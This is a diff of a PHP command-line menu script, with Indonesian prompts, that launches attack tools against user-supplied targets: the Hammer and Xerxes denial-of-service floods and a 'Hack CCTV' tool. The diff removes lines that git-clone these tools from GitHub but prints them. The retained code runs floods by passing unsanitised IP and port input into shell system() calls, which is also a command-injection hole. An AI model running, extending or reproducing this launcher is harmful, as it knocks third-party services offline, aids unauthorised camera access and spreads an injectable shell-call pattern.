@@ -28,13 +28,6 @@ $menu = trim(fgets(STDIN));
 
 if ($menu == 1){
 system('clear');
-sleep(1);
-echo "[!] Installing Hammer DDOS\n";
-sleep(1);
-echo "[!] Thanks to cyweb";
-system('git clone https://github.com/cyweb/hammer.git');
-system('cd hammer');
-system('clear');
 echo "[+] Masukan IP Target : ";
 $ip = trim(fgets(STDIN));
 echo "[+] Masukan Port : ";
@@ -50,18 +43,14 @@ system("python hammer.py -s '$ip' -p '$port' -t '$turbo'");
 }
 
 if ($menu == 2){
-system('clear');
-echo "[!] Installing Xerxes\n";
-system('git clone https://github.com/zanyarjamal/xerxes');
-system('cd xerxes');
-system('gcc xerxes -o xerxes.c');
+system('gcc fuck.c -o fuck');
 system('clear');
 echo "[+] Masukan Web Target : ( Tanpa HTTP / HTTPS )";
 $target = trim(fgets(STDIN));
 echo "[+] Masukan Port :";
 $ipWeb = trim(fgets(STDIN));
 system('clear');
-system("./xerxes '$target' '$ipWeb'");
+system("./fuck '$target' '$ipWeb'");
 }
   
 if ($menu == 3){
@@ -78,9 +67,6 @@ if ($menu == 3){
   
  if ($menu == 4){
    system('clear');
-   echo "[!] Installing Hack CCTV..\n";
-   system('git clone https://github.com/MrTamfanX/hackcctv');
-   system('cd hackcctv');
    system('python2 CctvX.py');
  }
   
